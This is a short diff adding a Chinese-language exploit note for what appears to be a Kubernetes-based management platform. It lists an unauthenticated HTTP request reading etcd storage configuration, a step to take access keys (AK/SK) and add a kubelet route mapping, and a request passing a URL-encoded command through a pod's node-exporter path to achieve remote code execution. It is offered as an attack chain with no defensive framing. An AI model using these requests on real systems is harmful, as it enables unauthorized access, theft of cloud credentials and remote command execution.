@@ -1,0 +1,5 @@
+1.未授权访问
+GET /open/v6/api/etcd/operate?key=/config/storage&method=get HTTP/1.1
+2.获取AKSK后使用脚本添加kubelet 路由映射（需获取TOKEN）
+3.向对应POD发起通信后实现RCE
+GET /open/wps/run/{namespace}/{podname}/node-exporter?cmd={url_encode_command}  HTTP/1.1
